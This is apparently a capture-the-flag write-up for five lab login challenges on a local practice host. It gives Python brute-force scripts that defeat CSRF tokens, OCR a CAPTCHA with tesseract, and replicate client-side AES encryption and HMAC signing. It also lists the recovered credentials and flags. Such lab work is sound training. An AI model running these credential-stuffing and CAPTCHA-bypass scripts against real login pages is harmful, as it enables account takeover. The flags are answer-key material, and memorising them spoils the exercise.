### Login1

```
import requests

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

with open("/home/kali/Documents/pass.txt", "r") as file:
 for line in file:
  a = line.strip()
  x = requests.post("http://192.168.70.202:3333/login1.php", proxies=proxies, data={"username":"claudetest1","password":a})
  if 'Password salah' in x.text:
   print('tidak valid')
  else:
   print(a)
```

use burpsuit to check value user and pass and will get confirmation text "Password salah".

> [!NOTE] Change file for checking
> with open("/home/kali/Documents/pass.txt", "r") as file:

first check for all user.txt, then check for pass.txt

user: claudetest1 <br>
pass: halo1027 <br>
flag: CSM{Ez_bgt_c0ba_c0ba_nya} <br>

![Screenshot 2025-04-25 164606](https://github.com/user-attachments/assets/02d8da3a-abea-4001-ada1-05b8566a1ced)


### Login2

testing get value:
```
import requests
from bs4 import BeautifulSoup

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

html = requests.get("http://192.168.70.202:3333/login2.php", proxies=proxies)

soup = BeautifulSoup(html.content, 'html.parser')

input_tag = soup.find('input', {'name': 'csrf_token'})
value = input_tag['value']

print(value)

```

insert to code before for search username:

```
import requests
from bs4 import BeautifulSoup

url = "http://192.168.70.202:3333/login2.php"
session = requests.Session()

with open("/home/kali/Documents/Login1/user.txt") as file:
    for line in file:
        username = line.strip()
        token = BeautifulSoup(session.get(url).content, 'html.parser').find('input', {'name': 'csrf_token'})['value']
        x = session.post(url, data={"csrf_token": token, "username": username, "password": "12345"})
        if 'Password salah' in x.text:
            print(username)
        else:
            print("salah")

```

using user.txt too for get the password:
```
import requests
from bs4 import BeautifulSoup

url = "http://192.168.70.202:3333/login2.php"
session = requests.Session()

with open("/home/kali/Documents/Login1/user.txt") as file:
    for line in file:
        password = line.strip()
        token = BeautifulSoup(session.get(url).content, 'html.parser').find('input', {'name': 'csrf_token'})['value']
        x = session.post(url, data={"csrf_token": token, "username": "claudetest1", "password": password})
        if 'Password salah' in x.text:
            print("salah")
        else:
            print(password)

```

username: claudetest1 <br>
pass: gracetest1 <br>
flag: CSM{S1mple_Skrep111ng!!__asdasd} <br>

![Screenshot 2025-04-26 012627](https://github.com/user-attachments/assets/20622899-a56b-4079-bb6d-b3362da1a0cf)


### Login3

my linux bad for having pytesseract, and it has tesseract tool for linux CLI. So, i used that tools for OCR:
[code]

searching for username:

```
import requests
from bs4 import BeautifulSoup
from PIL import Image
from io import BytesIO
import subprocess

url = "http://192.168.70.202:3333/login3.php"
session = requests.Session()

with open("/home/kali/Documents/Login1/user.txt") as file:
    for line in file:
        a = line.strip()

        soup = BeautifulSoup(session.get(url).content, 'html.parser')
        cap = f"http://192.168.70.202:3333/{soup.find('img')['src']}"
        img = Image.open(BytesIO(session.get(cap).content))
        img.save("/home/kali/Documents/Login1/cap.png")

        subprocess.run(["tesseract", "/home/kali/Documents/Login1/cap.png", "/home/kali/Documents/Login1/out"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with open("/home/kali/Documents/Login1/out.txt") as cap:
            captcha = cap.read().strip()

        a = {"username": a, "password": "12345", "captcha": captcha}
        x = session.post(url, data=a)

        if "Password salah" in x.text:
            print(f"valid: {user}")
        else:
            print(f"salah: {user}")

```

searching for password:
```
import requests
from bs4 import BeautifulSoup
from PIL import Image
from io import BytesIO
import subprocess
import re

url = "http://192.168.70.202:3333/login3.php"
session = requests.Session()

with open("/home/kali/Documents/Login1/pass.txt") as file:
    for line in file:
        password = line.strip()

        soup = BeautifulSoup(session.get(url).content, 'html.parser')
        cap_src = soup.find('img')['src']
        cap = f"http://192.168.70.202:3333/{cap_src}"

        img = Image.open(BytesIO(session.get(cap).content))
        img_path = "/home/kali/Documents/Login1/cap.png"
        out_txt = "/home/kali/Documents/Login1/out.txt"
        img.save(img_path)

        subprocess.run(["tesseract", img_path, out_txt[:-4]], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with open(out_txt) as cap:
            raw_captcha = cap.read().strip()
            captcha = re.sub(r'\W+', '', raw_captcha)

        data = {
            "username": "ilp_test1",
            "password": password,
            "captcha": captcha
        }

        x = session.post(url, data=data)

        if "Kode CAPTCHA salah" in x.text:
            print(f"Captcha salah: {captcha}")
        elif "Password salah" in X.text:
            print(f"Password salah: {password}")
        else:
            print(f"Berhasil Username: ilp_test1 | 
            Password: {password} | Captcha: {captcha}")
```

username: ilp_test1 <br>
password: Chalo1 <br>
flag: CSM{b444d_capcayyy_heheh3} <br>

![Screenshot 2025-04-26 021715](https://github.com/user-attachments/assets/8023887a-ee88-4de1-b527-41b99bd4f7cc)


### Login4

searching for username:

```
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt(text):
    key = b"MySecretKey12345"
    iv = b"RandomInitVector"
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return base64.b64encode(ct_bytes).decode('utf-8')

with open("/home/kali/Documents/Login1/user.txt", "r") as file:
	for line in file:
		a = line.strip()
		en = encrypt(a)
		data = { "enc_username":en, "enc_password":"12345"}
		x = requests.post("http://192.168.70.202:3333/login4.php", data=data)
		if 'Password salah' in x.text:
			print(f"valid {en}")
			break
		else:
			print('salah')
```

searching for password:

```
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt(text):
    key = b"MySecretKey12345"
    iv = b"RandomInitVector"
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return base64.b64encode(ct_bytes).decode('utf-8')

with open("/home/kali/Documents/Login1/pass.txt", "r") as file:
	for line in file:
		a = line.strip()
		en = encrypt(a)
		data = { "enc_username":"wtKS6o3WD62QDwWPw5EzBA==", "enc_password":en}
		x = requests.post("http://192.168.70.202:3333/login4.php", data=data)
		if 'Password salah' in x.text:
			print("valid")
		else:
			print(f"salah {en}")
```

user: moetest11 <br>
pass: halo111dent307 <br>
flag=CSM{encrypt33d_f0R_duummy} <br>

![Screenshot 2025-05-02 162611](https://github.com/user-attachments/assets/1f64a57f-8a42-48b4-9f15-4e9c0e26151b)


### Login5
searching for username:
```
import base64
import requests
import hashlib
import hmac
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

def encrypt(text):
    key = b"MySecretKey12345"
    iv = b"RandomInitVector"
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return base64.b64encode(ct_bytes).decode('utf-8')

def hmac_sha256(text):
    hmac_key = "ThisIsHmacSecretKey"
    h = hmac.new(hmac_key.encode('utf-8'), text.encode('utf-8'), hashlib.sha256)
    return h.hexdigest()

with open("/home/kali/Documents/Login1/user.txt", "r") as file:
    for line in file:
        a = line.strip()

        data = f'{{"username":"{a}","password":"12345"}}'
        en = encrypt(data)

        signature = hmac_sha256(en)

        headers = {"Content-Type": "text/plain", "X-Signature": signature}
        
        time.sleep(1)

        x = requests.post("http://192.168.70.202:3333/login5.php", proxies=proxies, data=en, headers=headers)

        if 'Password salah' in x.text:
            print(f"Username: {a}")
            break
        else:
            print("x")
```

searching for password:
```
import base64
import requests
import hashlib
import hmac
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

def encrypt(text):
    key = b"MySecretKey12345"
    iv = b"RandomInitVector"
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return base64.b64encode(ct_bytes).decode('utf-8')

def hmac_sha256(text):
    hmac_key = "ThisIsHmacSecretKey"
    h = hmac.new(hmac_key.encode('utf-8'), text.encode('utf-8'), hashlib.sha256)
    return h.hexdigest()

with open("/home/kali/Documents/Login1/pass.txt", "r") as file:
    for line in file:
        a = line.strip()

        data = f'{{"username":"juggstest11","password":"{a}"}}'
        en = encrypt(data)

        signature = hmac_sha256(en)

        headers = {"Content-Type": "text/plain", "X-Signature": signature}
        
        time.sleep(1)

        response = requests.post("http://192.168.70.202:3333/login5.php", proxies=proxies, data=en, headers=headers)

        if 'Password salah' in response.text:
            print("x")
        else:
            print(f"Password: {a}")
            break


```

user: juggstest11 <br>
pass: mobhalo1 <br>
flag=CSM{hm4c_s1nGature_b4ny@k_DiGun44kan!} <br>

![Screenshot 2025-05-02 224745](https://github.com/user-attachments/assets/f1c8ad2a-8432-4ab5-b406-b43e62ae0760)

